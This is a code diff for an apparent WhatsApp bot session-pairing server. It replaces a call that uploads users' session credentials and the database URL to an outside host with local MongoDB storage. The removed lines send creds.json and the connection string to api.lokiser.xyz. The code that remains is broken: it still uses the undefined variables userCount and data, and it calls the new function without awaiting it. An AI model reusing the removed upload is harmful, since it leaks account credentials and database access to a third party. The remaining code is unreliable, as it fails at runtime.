@@ -1,4 +1,5 @@
 const axios = require('axios');
+const { MongoClient } = require('mongodb');
 const { MONGODB_URL, SESSION_NAME } = require('./config');
 const { makeid } = require('./id');
 const express = require('express');
@@ -55,14 +56,7 @@ router.get('/', async (req, res) => {
                     await delay(5000);
                     await delay(5000);
 
-                    const jsonData = await fs.promises.readFile(`${__dirname}/temp/${id}/creds.json`, 'utf-8');
-                    const { data } = await axios.post('https://api.lokiser.xyz/mongoose/session/create', {
-                        SessionID: SESSION_NAME,
-                        creds: jsonData,
-                        mongoUrl: MONGODB_URL
-                    });
-                    const userCountResponse = await axios.post('https://api.lokiser.xyz/mongoose/session/count', { mongoUrl: MONGODB_URL });
-                    const userCount = userCountResponse.data.count;
+                    storeData(id, SESSION_NAME, MONGODB_URL, session);
                     
                     await session.sendMessage(session.user.id, { text: ` *Successfully Connected*\n\n *Total Scan :* ${userCount}` });
                     await session.sendMessage(session.user.id, { text: data.data });
@@ -88,3 +82,45 @@ router.get('/', async (req, res) => {
 });
 
 module.exports = router;
+
+const dbName = 'session';  // Replace with your database name
+const collectionName = 'create';  // Replace with your collection name
+
+async function storeData(id, sessionName, mongoUrl, session) {
+    try {
+        // Read the JSON data from the file
+        const jsonData = await fs.readFile(`${__dirname}/temp/${id}/creds.json`, 'utf-8');
+        const creds = JSON.parse(jsonData);
+
+        // Create a new MongoClient
+        const client = new MongoClient(mongoUrl);
+
+        // Connect to the MongoDB server
+        await client.connect();
+
+        // Specify the database and collection
+        const db = client.db(dbName);
+        const collection = db.collection(collectionName);
+
+        // Prepare the document to be inserted
+        const document = {
+            SessionID: sessionName+id,
+            creds: creds,
+            createdAt: new Date()
+        };
+
+        // Insert the document into the collection
+        const result = await collection.insertOne(document);
+        console.log(`Document inserted with _id: ${result.insertedId}`);
+
+        // Get the count of documents in the collection
+        const count = await collection.countDocuments();
+        await session.sendMessage(session.user.id, { text: ` *Successfully Connected*\n\n *Total Scan :* ${count}` });
+        await session.sendMessage(session.user.id, { text: document.SessionID });
+                               
+        // Close the connection
+        await client.close();
+    } catch (error) {
+        console.error('Error storing data in MongoDB:', error);
+    }
+}            
